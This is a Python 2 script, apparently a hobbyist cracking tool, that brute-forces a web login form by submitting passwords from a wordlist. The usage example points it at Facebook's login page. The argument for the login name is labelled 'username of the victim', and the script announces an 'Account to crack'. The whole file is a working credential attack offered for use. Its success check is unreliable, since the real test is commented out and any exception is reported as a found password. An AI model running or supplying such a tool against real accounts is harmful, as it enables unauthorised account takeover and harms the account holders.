import sys
import random
import mechanize
import cookielib
import argparse
import time 

example ='''python .py -u https://www.facebook.com/lgin -uI email -us username -pI pass -w word.txt -t https://www.facebook.com/?ref=tn_tnmn 
[+] the -t type the url in after request'''
prompt = '''
           _.   .'                         
       _.-' /  :   `-.'.'                  
    .-'-.  |        / /    :               
  .'  o   ; \     .' /   .'                
 /,,,,,,    =`-..'  /                      
  `.____.       `-.|     WHAT THE FUCK AM I
         `. .-     `.                      
          .'   |  =  \  `.                 
          |   /       \   :                
         /  .'\ =     =|                   
  .'    / .'   \       |                   
 :     / /     |       |                   
    .-','.   : | .    \|                   
           .'  ||    = |                   
               ||      /                   
               || -   /                    
               (|   ;|                     
_              |(   -:                     
 `-._          ||   ;|                     
  .- `-._      ||    :                     
`-._  _  `-._ .'|,  -|                     
    `-._l42  / .'    |                     
        `-._((/.----.\                     
            `(((  -  `-._                  
                `-._   _ `-._              
                    `-._  .- `-._          
                        `-._  _  `-.       
                            `-._  -        
                                `-._ 
                                '''
        
arparser = argparse.ArgumentParser(description='wordlist attack')


arparser.add_argument(
    "-u", "--url", required=False, help="URL to attack"
)

arparser.add_argument(
    "-uI", "--usernameId", required=False, help="the html username id"
)

arparser.add_argument(
    "-us", "--username", required=False, help="username of the victim"
)

arparser.add_argument(
    "-pI", "--passwordId", required=False, help="the html password id"
)

arparser.add_argument(
    "-w", "--wordlistfile", required=False, help="the word list file location"
)


arparser.add_argument(
    "-t", "--urltitle", required=False, help="the title of the url after attack"
)

parser = vars(arparser.parse_args())


login = parser["url"]
user_html_input = parser["usernameId"]
user = parser["username"]
html_pass_input = parser["passwordId"]
file = parser["wordlistfile"]
after_request_url = parser["urltitle"]

if login is None: 
    print example
    sys.exit()
 
 


 
useragents = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
 
 
 
def attack(password):
 
  try:
     sys.stdout.write("\r[*] trying %s.. " % password)
     sys.stdout.flush()
     br.addheaders = [('User-agent', random.choice(useragents))]
     site = br.open(login)
     start_time = time.time()
     br.select_form(nr=0)
 
       
     ##Facebook
     br.form[user_html_input] = user
     br.form[html_pass_input] = password
     br.submit()
     log = br.geturl()

     #if log != login:
     #   print "\n\n\n [*] Password found .. !!"
     #   print "\n [*] Password : %s\n" % (password)
     #   sys.exit(1)
  except Exception :
        print "\n[*] passwword found : %s" % password 
        print "if that password does not match try the one before it .."
        print 'Time elapsed: ' + str(time.time() - start_time)
        sys.exit(1)
 
def search():
    global password
    for password in passwords:
        attack(password.replace("\n",""))
 
 
 
def check():
 
    global br
    global passwords
    try:
       br = mechanize.Browser()
       cj = cookielib.LWPCookieJar()
       br.set_handle_robots(False)
       br.set_handle_equiv(True)
       br.set_handle_referer(True)
       br.set_handle_redirect(True)
       br.set_cookiejar(cj)
       br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
    except KeyboardInterrupt:
       print "\n[*] Exiting program ..\n"
       sys.exit(1)
    try:
       list = open(file, "r")
       passwords = list.readlines()
       k = 0
       while k < len(passwords):
          passwords[k] = passwords[k].strip()
          k += 1
    except IOError:
        print "\n [*] Error: check your password list path \n"
        sys.exit(1)
    except KeyboardInterrupt:
        print "\n [*] Exiting program ..\n"
        sys.exit(1)
    try:
        print prompt
        print " [*] Account to crack : %s" % (user)
        print " [*] Loaded :" , len(passwords), "passwords"
        print " [*] Cracking, please wait ..."
    except KeyboardInterrupt:
        print "\n [*] Exiting program ..\n"
        sys.exit(1)
    try:
        search()
        attack(password)
    except KeyboardInterrupt:
        print "\n [*] Exiting program ..\n"
        sys.exit(1)
 
if __name__ == '__main__':
    check()
